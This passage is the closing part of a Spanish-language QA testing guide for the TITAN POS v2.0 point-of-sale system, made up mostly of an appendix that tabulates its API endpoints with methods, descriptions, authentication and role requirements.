- [ ] Si se borra un producto que esta en el carrito de otro cajero — que pasa al completar la venta?

---

## Apendice: Referencia Rapida de Endpoints

### Autenticacion (`/api/v1/auth`)

| Metodo | Ruta | Descripcion | Auth |
|---|---|---|---|
| POST | `/login` | Iniciar sesion | No |
| GET | `/verify` | Verificar token | Si |

### Productos (`/api/v1/products`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/` | Listar productos | Si | Todos |
| GET | `/{id}` | Obtener por ID | Si | Todos |
| GET | `/sku/{sku}` | Obtener por SKU | Si | Todos |
| GET | `/scan/{sku}` | Buscar por barcode/SKU | Si | Todos |
| GET | `/low-stock` | Productos bajo stock | Si | Todos |
| GET | `/categories/list` | Listar categorias | Si | Todos |
| GET | `/{id}/stock-by-branch` | Stock por sucursal | Si | Todos |
| POST | `/` | Crear producto | Si | Gerente+ |
| PUT | `/{id}` | Actualizar producto | Si | Gerente+ (precios) |
| DELETE | `/{id}` | Desactivar producto | Si | Gerente+ |
| POST | `/stock` | Actualizar stock remoto | Si | Todos |
| POST | `/price` | Actualizar precio remoto | Si | Gerente+ |

### Clientes (`/api/v1/customers`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/` | Listar clientes | Si | Todos |
| GET | `/{id}` | Obtener por ID | Si | Todos |
| GET | `/{id}/sales` | Historial de compras | Si | Todos |
| GET | `/{id}/credit` | Info de credito | Si | Todos |
| POST | `/` | Crear cliente | Si | Todos |
| PUT | `/{id}` | Actualizar cliente | Si | Gerente+ (credito) |
| DELETE | `/{id}` | Desactivar cliente | Si | Gerente+ |

### Ventas (`/api/v1/sales`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/` | Listar ventas | Si | Todos |
| GET | `/search` | Buscar ventas | Si | Todos |
| GET | `/{id}` | Detalle de venta | Si | Todos |
| GET | `/{id}/events` | Eventos de auditoria | Si | Todos |
| POST | `/` | Crear venta | Si | Todos |
| POST | `/{id}/cancel` | Cancelar venta | Si | Gerente+ |
| GET | `/reports/daily-summary` | Resumen diario | Si | Todos |
| GET | `/reports/product-ranking` | Ranking productos | Si | Todos |
| GET | `/reports/hourly-heatmap` | Mapa calor horario | Si | Todos |

### Inventario (`/api/v1/inventory`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/movements` | Listar movimientos | Si | Todos |
| GET | `/alerts` | Alertas de stock bajo | Si | Todos |
| POST | `/adjust` | Ajustar stock | Si | Gerente+ |

### Turnos (`/api/v1/turns`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| POST | `/open` | Abrir turno | Si | Todos |
| POST | `/{id}/close` | Cerrar turno | Si | Dueno/Gerente+ |
| GET | `/current` | Turno actual | Si | Todos |
| GET | `/{id}` | Detalle turno | Si | Dueno/Gerente+ |
| GET | `/{id}/summary` | Resumen turno | Si | Dueno/Gerente+ |
| POST | `/{id}/movements` | Movimiento de caja | Si | Todos (PIN gerente) |

### Mermas (`/api/v1/mermas`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/pending` | Listar pendientes | Si | Gerente+ |
| POST | `/approve` | Aprobar/rechazar | Si | Gerente+ |

### Gastos (`/api/v1/expenses`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/summary` | Resumen mes/anio | Si | Todos |
| POST | `/` | Registrar gasto | Si | Gerente+ |

### Dashboard (`/api/v1/dashboard`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/quick` | Status rapido | Si | Todos |
| GET | `/resico` | Monitoreo RESICO | Si | Todos |
| GET | `/expenses` | Gastos mes/anio | Si | Todos |
| GET | `/wealth` | Riqueza real | Si | Gerente+ |
| GET | `/ai` | Alertas IA | Si | Todos |
| GET | `/executive` | Ejecutivo completo | Si | Gerente+ |

### Empleados (`/api/v1/employees`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/` | Listar empleados | Si | Todos |
| GET | `/{id}` | Obtener por ID | Si | Todos |
| POST | `/` | Crear empleado | Si | Gerente+ |
| PUT | `/{id}` | Actualizar empleado | Si | Gerente+ |
| DELETE | `/{id}` | Desactivar empleado | Si | Gerente+ |

### Sincronizacion (`/api/v1/sync`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| GET | `/status` | Estado conexion | Si | Todos |
| GET | `/products` | Pull productos | Si | Todos |
| GET | `/customers` | Pull clientes | Si | Todos |
| GET | `/sales` | Pull ventas | Si | Todos |
| GET | `/shifts` | Pull turnos | Si | Todos |
| POST | `/{table}` | Push datos | Si | Gerente+ |

### Remoto (`/api/v1/remote`)

| Metodo | Ruta | Descripcion | Auth | RBAC |
|---|---|---|---|---|
| POST | `/open-drawer` | Abrir cajon | Si | Gerente+ |
| GET | `/turn-status` | Estado turno | Si | Todos |
| GET | `/live-sales` | Ventas en vivo | Si | Todos |
| POST | `/notification` | Enviar notificacion | Si | Gerente+ |
| GET | `/notifications/pending` | Obtener pendientes | Si | Todos |
| POST | `/change-price` | Cambiar precio | Si | Gerente+ |
| GET | `/system-status` | Estado del sistema | Si | Todos |

### Catalogo SAT (`/api/v1/sat`)

| Metodo | Ruta | Descripcion | Auth |
|---|---|---|---|
| GET | `/search?q=texto` | Buscar claves SAT | No |
| GET | `/{code}` | Descripcion de clave | No |

---

*Documento generado para TITAN POS v2.0 - Febrero 2026*
*Guia exhaustiva de QA/Testing incluyendo pruebas destructivas, seguridad, estres, edge cases, compatibilidad, integridad de datos, recuperacion, archivos maliciosos, Unicode/emojis, inyeccion en campos numericos, bypass de API, concurrencia y limites del sistema.*
